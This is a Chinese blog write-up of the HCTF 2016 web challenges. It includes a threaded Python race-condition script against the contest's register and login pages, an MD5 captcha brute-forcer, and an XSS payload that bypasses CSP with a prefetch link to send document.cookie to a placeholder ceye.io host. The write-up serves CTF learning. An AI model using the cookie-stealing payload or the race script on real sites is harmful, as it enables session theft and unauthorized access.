
<!DOCTYPE html>

<html lang="zh-cn">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<title>2016 HCTF web writeup - l3m0n - 博客园</title>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./2016 HCTF web writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<script src="./2016 HCTF web writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
<script src="./2016 HCTF web writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
</head>
<body>
<a name="top"></a>
<!--done-->
<div id="home">
<div id="header">
<div id="blogTitle">
<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./2016 HCTF web writeup - l3m0n - 博客园/top.gif"/></div>
<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./2016 HCTF web writeup - l3m0n - 博客园/logo.gif"/></a>
<!--done-->
<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
<h2></h2>
</div><!--end: blogTitle 博客的标题和副标题 -->
<div id="navigator">
<ul id="navList">
<li></li>
<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
<li></li>
<li></li>
<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./2016 HCTF web writeup - l3m0n - 博客园/xml.gif"/></a></li>
</ul>
<div class="clear"></div>
<div class="blogStats">
<div id="blog_stats">
<!--done-->
随笔- 1 
文章- 65 
评论- 17 
</div>
</div><!--end: blogStats -->
</div><!--end: navigator 博客导航栏 -->
</div><!--end: header 头部 -->
<div id="main">
<div id="mainContent">
<div class="forFlow">
<div id="post_detail">
<!--done-->
<div id="topics">
<div class="post">
<h1 class="postTitle">
<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/2016_hctf_web_writeup.html" id="cb_post_title_url">2016 HCTF web writeup</a>
</h1>
<div class="clear"></div>
<div class="postBody">
<div class="cnblogs-markdown" id="cnblogs_post_body"><h1 id="hctf-2016-web-writeup">HCTF 2016 web-writeup</h1>
<h3 id="年的flag">2099年的flag</h3>
<p>only ios99 can get flag(Maybe you can easily get the flag in 2099</p>
<p>改下ua：</p>
<pre><code>User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 99_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25 </code></pre>
<h3 id="restful">RESTFUL</h3>
<p>修改方式为put，然后/money/100000</p>
<p><img src="./2016 HCTF web writeup - l3m0n - 博客园/804631-20161128220136209-643046513.png"/></p>
<h3 id="giligili">giligili</h3>
<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript">        <span class="op">&lt;</span>script type<span class="op">=</span><span class="st">"text/javascript"</span><span class="op">&gt;</span>
            <span class="co">// Come on and get flag:&gt;</span>

            <span class="kw">var</span> _ <span class="op">=</span> <span class="op">{</span> <span class="bn">0x4c19cff</span><span class="op">:</span> <span class="st">"random"</span><span class="op">,</span> <span class="bn">0x4728122</span><span class="op">:</span> <span class="st">"charCodeAt"</span><span class="op">,</span> <span class="bn">0x2138878</span><span class="op">:</span> <span class="st">"substring"</span><span class="op">,</span> <span class="bn">0x3ca9c7b</span><span class="op">:</span> <span class="st">"toString"</span><span class="op">,</span> <span class="bn">0x574030a</span><span class="op">:</span> <span class="st">"eval"</span><span class="op">,</span> <span class="bn">0x270aba9</span><span class="op">:</span> <span class="st">"indexOf"</span><span class="op">,</span> <span class="bn">0x221201f</span><span class="op">:</span> <span class="kw">function</span>(_9) <span class="op">{</span> <span class="kw">var</span> _8 <span class="op">=</span> []<span class="op">;</span> <span class="cf">for</span> (<span class="kw">var</span> _a <span class="op">=</span> <span class="dv">0</span><span class="op">,</span> _b <span class="op">=</span> <span class="va">_9</span>.<span class="at">length</span><span class="op">;</span> _a <span class="op">&lt;</span> _b<span class="op">;</span> _a<span class="op">++</span>) <span class="op">{</span> <span class="va">_8</span>.<span class="at">push</span>(<span class="at">Number</span>(<span class="va">_9</span>.<span class="at">charCodeAt</span>(_a)).<span class="at">toString</span>(<span class="dv">16</span>))<span class="op">;</span> <span class="op">}</span> <span class="cf">return</span> <span class="st">"0x"</span> <span class="op">+</span> <span class="va">_8</span>.<span class="at">join</span>(<span class="st">""</span>)<span class="op">;</span> <span class="op">},</span> <span class="bn">0x240cb06</span><span class="op">:</span> <span class="kw">function</span>(_2<span class="op">,</span> _3) <span class="op">{</span> <span class="kw">var</span> _4 <span class="op">=</span> <span class="va">Math</span>.<span class="at">max</span>(<span class="va">_2</span>.<span class="at">length</span><span class="op">,</span> <span class="va">_3</span>.<span class="at">length</span>)<span class="op">;</span> <span class="kw">var</span> _7 <span class="op">=</span> _2 <span class="op">+</span> _3<span class="op">;</span> <span class="kw">var</span> _6 <span class="op">=</span> <span class="st">""</span><span class="op">;</span> <span class="cf">for</span>(<span class="kw">var</span> _5<span class="op">=</span><span class="dv">0</span><span class="op">;</span> _5<span class="op">&lt;</span>_4<span class="op">;</span> _5<span class="op">++</span>) <span class="op">{</span> _6 <span class="op">+=</span> <span class="va">_7</span>.<span class="at">charAt</span>((<span class="va">_2</span>.<span class="at">charCodeAt</span>(_5<span class="op">%</span><span class="va">_2</span>.<span class="at">length</span>) <span class="op">^</span> <span class="va">_3</span>.<span class="at">charCodeAt</span>(_5<span class="op">%</span><span class="va">_3</span>.<span class="at">length</span>)) <span class="op">%</span> _4)<span class="op">;</span> <span class="op">}</span> <span class="cf">return</span> _6<span class="op">;</span> <span class="op">},</span> <span class="bn">0x5c623d0</span><span class="op">:</span> <span class="kw">function</span>(_c<span class="op">,</span> _d) <span class="op">{</span> <span class="kw">var</span> _e <span class="op">=</span> <span class="st">""</span><span class="op">;</span> <span class="cf">for</span>(<span class="kw">var</span> _f<span class="op">=</span><span class="dv">0</span><span class="op">;</span> _f<span class="op">&lt;</span>_d<span class="op">;</span> _f<span class="op">++</span>) <span class="op">{</span> _e <span class="op">+=</span> _c<span class="op">;</span> <span class="op">}</span> <span class="cf">return</span> _e<span class="op">;</span> <span class="op">}</span> <span class="op">};</span>
            <span class="kw">var</span> $ <span class="op">=</span> [ <span class="bn">0x4c19cff</span><span class="op">,</span> <span class="bn">0x3cfbd6c</span><span class="op">,</span> <span class="bn">0xb3f970</span><span class="op">,</span> <span class="bn">0x4b9257a</span><span class="op">,</span> <span class="bn">0x1409cc7</span><span class="op">,</span> <span class="bn">0x46e990e</span><span class="op">,</span> <span class="bn">0x2138878</span><span class="op">,</span> <span class="bn">0x1e1049</span><span class="op">,</span> <span class="bn">0x164a1f9</span><span class="op">,</span> <span class="bn">0x494c61f</span><span class="op">,</span> <span class="bn">0x490f545</span><span class="op">,</span> <span class="bn">0x51ecfcb</span><span class="op">,</span> <span class="bn">0x4c7911a</span><span class="op">,</span> <span class="bn">0x29f7b65</span><span class="op">,</span> <span class="bn">0x4dde0e4</span><span class="op">,</span> <span class="bn">0x49f889f</span><span class="op">,</span> <span class="bn">0x5ebd02c</span><span class="op">,</span> <span class="bn">0x556f342</span><span class="op">,</span> <span class="bn">0x3f7f3f6</span><span class="op">,</span> <span class="bn">0x11544aa</span><span class="op">,</span> <span class="bn">0x53ed47d</span><span class="op">,</span> <span class="bn">0x697a</span><span class="op">,</span> <span class="bn">0x623f21c1</span><span class="op">,</span> <span class="bn">0x5c623d0</span><span class="op">,</span> <span class="bn">0x32e8f8b</span><span class="op">,</span> <span class="bn">0x3ca9c7b</span><span class="op">,</span> <span class="bn">0x367a49b</span><span class="op">,</span> <span class="bn">0x360179b</span><span class="op">,</span> <span class="bn">0x5c862d6</span><span class="op">,</span> <span class="bn">0x30dc1af</span><span class="op">,</span> <span class="bn">0x7797d1</span><span class="op">,</span> <span class="bn">0x221201f</span><span class="op">,</span> <span class="bn">0x5eb4345</span><span class="op">,</span> <span class="bn">0x5e9baad</span><span class="op">,</span> <span class="bn">0x39b3b47</span><span class="op">,</span> <span class="bn">0x32f0b8f</span><span class="op">,</span> <span class="bn">0x48554de</span><span class="op">,</span> <span class="bn">0x3e8b5e8</span><span class="op">,</span> <span class="bn">0x5e4f31f</span><span class="op">,</span> <span class="bn">0x48a53a6</span><span class="op">,</span> <span class="bn">0x270aba9</span><span class="op">,</span> <span class="bn">0x240cb06</span><span class="op">,</span> <span class="bn">0x574030a</span><span class="op">,</span> <span class="bn">0x1618f3a</span><span class="op">,</span> <span class="bn">0x271259f</span><span class="op">,</span> <span class="bn">0x3a306e5</span><span class="op">,</span> <span class="bn">0x1d33b46</span><span class="op">,</span> <span class="bn">0x17c29b5</span><span class="op">,</span> <span class="bn">0x1cf02f4</span><span class="op">,</span> <span class="bn">0xeb896b</span> ]<span class="op">;</span>
            <span class="kw">var</span> a<span class="op">,</span> b<span class="op">,</span> c<span class="op">,</span> d<span class="op">,</span> e<span class="op">,</span> f<span class="op">,</span> g<span class="op">,</span> h<span class="op">,</span> i<span class="op">,</span> j<span class="op">,</span> k<span class="op">,</span> l<span class="op">,</span> m<span class="op">,</span> n<span class="op">,</span> o<span class="op">,</span> p<span class="op">,</span> q<span class="op">,</span> r<span class="op">,</span> s<span class="op">,</span> t<span class="op">,</span> u<span class="op">,</span> v<span class="op">,</span> w<span class="op">,</span> x<span class="op">,</span> y<span class="op">,</span> z<span class="op">;</span>
            <span class="kw">function</span> <span class="at">check</span>() <span class="op">{</span>
                <span class="kw">var</span> answer <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">"message"</span>).<span class="at">value</span><span class="op">;</span>
                <span class="kw">var</span> correct <span class="op">=</span> (<span class="kw">function</span>() <span class="op">{</span>
                    <span class="cf">try</span> <span class="op">{</span>
                        h <span class="op">=</span> <span class="kw">new</span> <span class="at">MersenneTwister</span>(<span class="at">parseInt</span>(<span class="at">btoa</span>(answer[_[$[<span class="dv">6</span>]]](<span class="dv">0</span><span class="op">,</span> <span class="dv">4</span>))<span class="op">,</span> <span class="dv">32</span>))<span class="op">;</span>
                        e <span class="op">=</span> h[_[$[<span class="st">""</span><span class="op">+</span> <span class="op">+</span>[]]]]()<span class="op">*</span>(<span class="st">""</span><span class="op">+{}</span>)[_[<span class="bn">0x4728122</span>]](<span class="bn">0xc</span>)<span class="op">;</span> <span class="cf">for</span>(<span class="kw">var</span> _1<span class="op">=</span><span class="dv">0</span><span class="op">;</span> _1<span class="op">&lt;</span><span class="va">h</span>.<span class="at">mti</span><span class="op">;</span> _1<span class="op">++</span>) <span class="op">{</span> e <span class="op">^=</span> <span class="va">h</span>.<span class="at">mt</span>[_1]<span class="op">;</span> <span class="op">}</span>
                        l <span class="op">=</span> <span class="kw">new</span> <span class="at">MersenneTwister</span>(e)<span class="op">,</span> v <span class="op">=</span> <span class="kw">true</span><span class="op">;</span>
                        <span class="va">l</span>.<span class="at">random</span>()<span class="op">;</span> <span class="va">l</span>.<span class="at">random</span>()<span class="op">;</span> <span class="va">l</span>.<span class="at">random</span>()<span class="op">;</span>
                        o <span class="op">=</span> <span class="va">answer</span>.<span class="at">split</span>(<span class="st">"_"</span>)<span class="op">;</span>
                        i <span class="op">=</span> <span class="va">l</span>.<span class="at">mt</span>[<span class="op">~~</span>(<span class="va">h</span>.<span class="at">random</span>()<span class="op">*</span>$[<span class="bn">0x1f</span>])<span class="op">%</span><span class="bn">0xff</span>]<span class="op">;</span>
                        s <span class="op">=</span> [<span class="st">"0x"</span> <span class="op">+</span> i[_[$[<span class="va">$</span>.<span class="at">length</span>/<span class="dv">2</span>]]](<span class="bn">0x10</span>)<span class="op">,</span> <span class="st">"0x"</span> <span class="op">+</span> e[_[$[<span class="va">$</span>.<span class="at">length</span>/<span class="dv">2</span>]]](<span class="bn">0o20</span>).<span class="at">split</span>(<span class="st">"-"</span>)[<span class="dv">1</span>]]<span class="op">;</span>
                        e <span class="op">=-</span> (<span class="kw">this</span>[_[$[<span class="dv">42</span>]]](_[$[<span class="dv">31</span>]](o[<span class="dv">1</span>])) <span class="op">^</span> s[<span class="dv">0</span>])<span class="op">;</span> <span class="cf">if</span> (<span class="op">-</span>e <span class="op">!=</span> $[<span class="dv">21</span>]) <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
                        e <span class="op">^=</span> (<span class="kw">this</span>[_[$[<span class="dv">42</span>]]](_[$[<span class="dv">31</span>]](o[<span class="dv">2</span>])) <span class="op">^</span> s[<span class="dv">1</span>])<span class="op">;</span> <span class="cf">if</span> (<span class="op">-</span>e <span class="op">!=</span> $[<span class="dv">22</span>]) <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span> e <span class="op">-=</span> <span class="bn">0x352c4a9b</span><span class="op">;</span>
                        t <span class="op">=</span> <span class="kw">new</span> <span class="at">MersenneTwister</span>(<span class="va">Math</span>.<span class="at">sqrt</span>(<span class="op">-</span>e))<span class="op">;</span>
                        <span class="va">h</span>.<span class="at">random</span>()<span class="op">;</span>
                        a <span class="op">=</span> <span class="va">l</span>.<span class="at">random</span>()<span class="op">;</span>
                        <span class="va">t</span>.<span class="at">random</span>()<span class="op">;</span>
                        y <span class="op">=</span> [ <span class="bn">0xb3f970</span><span class="op">,</span> <span class="bn">0x4b9257a</span><span class="op">,</span> <span class="bn">0x46e990e</span> ].<span class="at">map</span>(<span class="kw">function</span>(i) <span class="op">{</span> <span class="cf">return</span> $[_[$[<span class="dv">40</span>]]](i)<span class="op">+</span> <span class="op">+</span><span class="dv">1</span><span class="op">+</span> <span class="op">-</span><span class="dv">1</span><span class="op">-</span> <span class="op">+</span><span class="dv">1</span><span class="op">;</span> <span class="op">}</span>)<span class="op">;</span>
                        o[<span class="dv">0</span>] <span class="op">=</span> o[<span class="dv">0</span>].<span class="at">substring</span>(<span class="dv">5</span>)<span class="op">;</span> o[<span class="dv">3</span>] <span class="op">=</span> o[<span class="dv">3</span>].<span class="at">substring</span>(<span class="dv">0</span><span class="op">,</span> o[<span class="dv">3</span>].<span class="at">length</span> <span class="op">-</span> <span class="dv">1</span>)<span class="op">;</span>
                        u <span class="op">=</span> <span class="op">~~~~~~~~~~~~~~~~</span>(a <span class="op">*</span> i)<span class="op">;</span> <span class="cf">if</span> (o[<span class="dv">0</span>].<span class="at">length</span> <span class="op">&gt;</span> <span class="dv">5</span>) <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
                        a <span class="op">=</span> <span class="at">parseInt</span>(_[$[<span class="dv">23</span>]](<span class="st">"1"</span><span class="op">,</span> <span class="va">Math</span>.<span class="at">max</span>(o[<span class="dv">0</span>].<span class="at">length</span><span class="op">,</span> o[<span class="dv">3</span>].<span class="at">length</span>))<span class="op">,</span> <span class="dv">3</span>) <span class="op">^</span> <span class="at">eval</span>(_[$[<span class="dv">31</span>]](o[<span class="dv">0</span>]))<span class="op">;</span>
                        r <span class="op">=</span> (<span class="va">h</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">l</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">t</span>.<span class="at">random</span>()) / (<span class="va">h</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">l</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">t</span>.<span class="at">random</span>())<span class="op">;</span>
                        e <span class="op">^=</span> <span class="op">~</span>r<span class="op">;</span>
                        r <span class="op">=</span> (<span class="va">h</span>.<span class="at">random</span>() / <span class="va">l</span>.<span class="at">random</span>() / <span class="va">t</span>.<span class="at">random</span>()) / (<span class="va">h</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">l</span>.<span class="at">random</span>() <span class="op">*</span> <span class="va">t</span>.<span class="at">random</span>())<span class="op">;</span>
                        e <span class="op">^=</span> <span class="op">~~</span>r<span class="op">;</span>
                        a <span class="op">+=</span> _[$[<span class="dv">31</span>]](o[<span class="dv">3</span>].<span class="at">substring</span>(o[<span class="dv">3</span>].<span class="at">length</span> <span class="op">-</span> <span class="dv">2</span>)).<span class="at">split</span>(<span class="st">"x"</span>)[<span class="dv">1</span>]<span class="op">;</span> <span class="cf">if</span> (<span class="at">parseInt</span>(<span class="va">a</span>.<span class="at">split</span>(<span class="st">"84"</span>)[<span class="dv">1</span>]<span class="op">,</span> <span class="va">$</span>.<span class="at">length</span>/<span class="dv">2</span>) <span class="op">!=</span> <span class="bn">0x4439feb</span>) <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
                        d <span class="op">=</span> <span class="at">parseInt</span>(a<span class="op">,</span> <span class="dv">16</span>) <span class="op">==</span> (<span class="va">Math</span>.<span class="at">pow</span>(<span class="dv">2</span><span class="op">,</span> <span class="dv">16</span>)<span class="op">+</span> <span class="op">-</span><span class="dv">5</span><span class="op">+</span> <span class="st">""</span>) <span class="op">+</span> o[<span class="dv">3</span>].<span class="at">charCodeAt</span>(o[<span class="dv">3</span>].<span class="at">length</span> <span class="op">-</span> <span class="dv">3</span>).<span class="at">toString</span>(<span class="dv">16</span>) <span class="op">+</span> <span class="st">"53846"</span> <span class="op">+</span> (<span class="kw">new</span> <span class="at">Date</span>().<span class="at">getFullYear</span>() <span class="op">-</span> <span class="dv">1</span> <span class="op">+</span> <span class="st">""</span>)<span class="op">;</span>
                        i <span class="op">=</span> <span class="bn">0xffff</span><span class="op">;</span>
                        n <span class="op">=</span> (p <span class="op">=</span> (f <span class="op">=</span> _[$[<span class="dv">23</span>]](o[<span class="dv">3</span>].<span class="at">charAt</span>(o[<span class="dv">3</span>].<span class="at">length</span> <span class="op">-</span> <span class="dv">4</span>)<span class="op">,</span> <span class="dv">3</span>)) <span class="op">==</span> o[<span class="dv">3</span>].<span class="at">substring</span>(<span class="dv">1</span><span class="op">,</span> <span class="dv">4</span>))<span class="op">;</span>
                        g <span class="op">=</span> <span class="dv">3</span><span class="op">;</span>
                        t <span class="op">=</span> _[$[<span class="dv">23</span>]](o[<span class="dv">3</span>].<span class="at">charAt</span>(<span class="dv">3</span>)<span class="op">,</span> <span class="dv">3</span>) <span class="op">==</span> o[<span class="dv">3</span>].<span class="at">substring</span>(<span class="dv">5</span><span class="op">,</span> <span class="dv">8</span>) <span class="op">&amp;&amp;</span> o[<span class="dv">3</span>].<span class="at">charCodeAt</span>(<span class="dv">1</span>) <span class="op">*</span> o[<span class="dv">0</span>].<span class="at">charCodeAt</span>(<span class="dv">0</span>) <span class="op">==</span> <span class="bn">0x2ef3</span><span class="op">;</span>
                        h <span class="op">=</span> ((<span class="dv">31249</span><span class="op">*</span>g) <span class="op">&amp;</span> i).<span class="at">toString</span>(<span class="dv">16</span>)<span class="op">;</span>
                        i <span class="op">=</span> _[$[<span class="dv">31</span>]](o[<span class="dv">3</span>].<span class="at">split</span>(f).<span class="at">join</span>(<span class="st">""</span>).<span class="at">substring</span>(<span class="dv">0</span><span class="op">,</span> <span class="dv">2</span>)).<span class="at">split</span>(<span class="st">"x"</span>)[<span class="dv">1</span>]<span class="op">;</span>
                        s <span class="op">=</span> i <span class="op">==</span> h<span class="op">;</span>
                        <span class="cf">return</span> (p <span class="op">&amp;</span> t <span class="op">&amp;</span> s <span class="op">&amp;</span> d) <span class="op">===</span> <span class="dv">1</span> <span class="op">||</span> (p <span class="op">&amp;</span> t <span class="op">&amp;</span> s <span class="op">&amp;</span> d) <span class="op">===</span> <span class="kw">true</span><span class="op">;</span>
                    <span class="op">}</span> <span class="cf">catch</span> (e) <span class="op">{</span>
                        <span class="va">console</span>.<span class="at">log</span>(<span class="st">"gg"</span>)<span class="op">;</span>
                        <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
                    <span class="op">}</span>
                <span class="op">}</span>)()<span class="op">;</span>

                <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">"message"</span>).<span class="at">placeholder</span> <span class="op">=</span> correct <span class="op">?</span> <span class="st">"correct"</span> : <span class="st">"wrong"</span><span class="op">;</span>
                <span class="cf">if</span> (correct) <span class="op">{</span>
                    <span class="at">alert</span>(<span class="st">"Congratulations! you got it!"</span>)<span class="op">;</span>
                <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span>
                    <span class="at">alert</span>(<span class="st">"Sorry, you are wrong..."</span>)<span class="op">;</span>
                <span class="op">}</span>
            <span class="op">};</span>
        <span class="op">&lt;</span><span class="ss">/script&gt;</span></code></pre></div>
<p>以前的一个ctf的题目：</p>
<pre><code>https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md</code></pre>
<p>=.=，过程还是很复杂的。不过总体来说就是为了满足一些条件从而反推出答案。</p>
<p>hctf{wh3r3_iz_y0ur_neee3eeed??}</p>
<h3 id="兵者多诡">兵者多诡</h3>
<p>zip协议包含文件。</p>
<h3 id="必须比香港记者还要快">必须比香港记者还要快</h3>
<p>有一个http://changelog.hctf.io/README.md文件</p>
<pre><code>- 2016.11.11
完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。
判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。
XD

- 2016.11.10
老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。</code></pre>
<p>也就是注册的时候是管理员，然后再update降为管理员，最后再在index.php里面是进行SESSION判断。</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co">#!/usr/bin/python</span>
<span class="co"># -*- coding: utf-8 -*-</span>

<span class="im">import</span> requests
<span class="im">import</span> uuid
<span class="im">import</span> re
<span class="im">import</span> threading

url <span class="op">=</span> <span class="st">"http://changelog.hctf.io/register.php"</span>
url1 <span class="op">=</span> <span class="st">"http://changelog.hctf.io/login.php"</span>
url2 <span class="op">=</span> <span class="st">"http://changelog.hctf.io/index.php"</span>

username <span class="op">=</span> <span class="st">""</span>
session <span class="op">=</span> <span class="st">""</span>

<span class="kw">def</span> sess():
    r <span class="op">=</span> requests.get(url1)
    m <span class="op">=</span> re.search(<span class="st">'PHPSESSID=(.*?);'</span>,r.headers[<span class="st">'Set-Cookie'</span>])
    <span class="cf">if</span> m:
        <span class="cf">return</span> <span class="bu">str</span>(m.group(<span class="dv">1</span>))

<span class="kw">def</span> regist():
    <span class="kw">global</span> username,session
    <span class="cf">while</span> <span class="va">True</span>:
        data <span class="op">=</span> {
            <span class="st">'username'</span> : username,
            <span class="co">'password'</span> : <span class="st">'1'</span>,
            <span class="co">'gogogo'</span> : <span class="st">'苟!'</span>,
        }
        cookie <span class="op">=</span> {
            <span class="st">'PHPSESSID'</span> : session
        }
        r <span class="op">=</span> requests.post(url, data<span class="op">=</span>data, cookies<span class="op">=</span>cookie, timeout<span class="op">=</span><span class="dv">3</span>)
        <span class="cf">if</span> <span class="st">'搞事'</span> <span class="op">in</span> r.content:
            <span class="bu">print</span> <span class="st">"Error."</span>
        <span class="bu">print</span> r.content

<span class="kw">def</span> login():
    <span class="kw">global</span> username,session
    <span class="cf">while</span> <span class="va">True</span>:
        data1 <span class="op">=</span> {
            <span class="st">'username'</span> : username,
            <span class="co">'password'</span> : <span class="st">'1'</span>,
            <span class="co">'gogogo'</span> : <span class="st">'苟!'</span>,
        }
        cookie1 <span class="op">=</span> {
            <span class="st">'PHPSESSID'</span> : session
        }

        r1 <span class="op">=</span> requests.post(url1, data<span class="op">=</span>data1, cookies<span class="op">=</span>cookie1, timeout<span class="op">=</span><span class="dv">5</span>)
        content <span class="op">=</span> r1.content
        <span class="bu">print</span> <span class="st">"login: "</span> <span class="op">+</span> username <span class="op">+</span> <span class="st">'-'</span> <span class="op">+</span> session
        <span class="cf">if</span> <span class="st">'gogogo'</span> <span class="op">not</span> <span class="op">in</span> content:
            <span class="bu">print</span> content

        <span class="cf">if</span> <span class="st">'hctf'</span> <span class="op">in</span> content:
            <span class="bu">print</span> content <span class="op">*</span> <span class="dv">10</span>

        <span class="cf">if</span> <span class="st">'zero'</span> <span class="op">in</span> content:
            <span class="bu">print</span> <span class="st">'aaaa'</span>
            username <span class="op">=</span> <span class="bu">str</span>(uuid.uuid4())
            session <span class="op">=</span> sess()

username <span class="op">=</span> <span class="bu">str</span>(uuid.uuid4())
session <span class="op">=</span> sess()

<span class="kw">def</span> main():
    threadpool<span class="op">=</span>[]

    <span class="cf">for</span> n <span class="op">in</span> <span class="bu">xrange</span>(<span class="dv">10</span>):
        th <span class="op">=</span> threading.Thread(target<span class="op">=</span>login)
        th.setDaemon(<span class="va">True</span>)
        threadpool.append(th)
    <span class="cf">for</span> n <span class="op">in</span> <span class="bu">xrange</span>(<span class="dv">2</span>):
        th <span class="op">=</span> threading.Thread(target<span class="op">=</span>regist)
        th.setDaemon(<span class="va">True</span>)
        threadpool.append(th)
    <span class="cf">for</span> th <span class="op">in</span> threadpool:
        th.start()
    <span class="cf">for</span> th <span class="op">in</span> threadpool :
        threading.Thread.join(th)

<span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">'__main__'</span>:
    main()</code></pre></div>
<p><img src="./2016 HCTF web writeup - l3m0n - 博客园/804631-20161128220157037-477734574.png"/></p>
<p>竞争一下，在注册insert后，update降权前登陆进去就可以获得flag。</p>
<h3 id="guestbook">guestbook</h3>
<p>有一个类似验证码的东西：<br/>
substr(md5($code),0,4) =='xxxx'</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
<span class="kw">$a</span> = <span class="kw">$argv</span><span class="ot">[</span><span class="dv">1</span><span class="ot">];</span>
<span class="kw">for</span><span class="ot">(</span><span class="kw">$i</span>=<span class="dv">1</span><span class="ot">;</span><span class="kw">$i</span>&lt;<span class="dv">1000000</span><span class="ot">;</span><span class="kw">$i</span>++<span class="ot">)</span>{
    <span class="kw">if</span><span class="ot">(</span><span class="fu">substr</span><span class="ot">(</span><span class="fu">md5</span><span class="ot">(</span><span class="kw">$i</span><span class="ot">),</span><span class="dv">0</span><span class="ot">,</span><span class="dv">4</span><span class="ot">)</span> == <span class="kw">$a</span><span class="ot">)</span>{
        <span class="fu">echo</span> <span class="kw">$i</span><span class="ot">;</span>
        <span class="fu">exit</span><span class="ot">();</span>
    }
}
<span class="fu">echo</span> <span class="st">"ok"</span><span class="ot">;</span></code></pre></div>
<p>程序跑一跑就好了。</p>
<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</code></pre>
<p>通过预加载来绕过csp。</p>
<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="op">&lt;</span>scrscriptipt<span class="op">&gt;</span><span class="kw">var</span> n0t <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">"lilinknk"</span>)<span class="op">;</span><span class="va">n0t</span>.<span class="at">setAttribute</span>(<span class="st">"rel"</span><span class="op">,</span> <span class="st">"prefetch"</span>)<span class="op">;</span><span class="va">n0t</span>.<span class="at">setAttribute</span>(<span class="st">"href"</span><span class="op">,</span> <span class="st">"//xxx.ceye.io/"</span><span class="op">+</span><span class="at">escape</span>(<span class="va">document</span>.<span class="at">cookie</span>))<span class="op">;</span><span class="va">document</span>.<span class="va">head</span>.<span class="at">appendChild</span>(n0t)<span class="op">;&lt;</span><span class="ss">/SCRscriptIPT&gt;</span></code></pre></div>
<pre><code>[27/Nov/2016:14:02:29 +0800] "GET /aaat HTTP/1.1" 404 433 "http://guestbook.hctf.io/admin_lorexxar.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2914.3 Safari/537.36"</code></pre>
<h3 id="secret-area">secret area</h3>
<p>也是一个csp。</p>
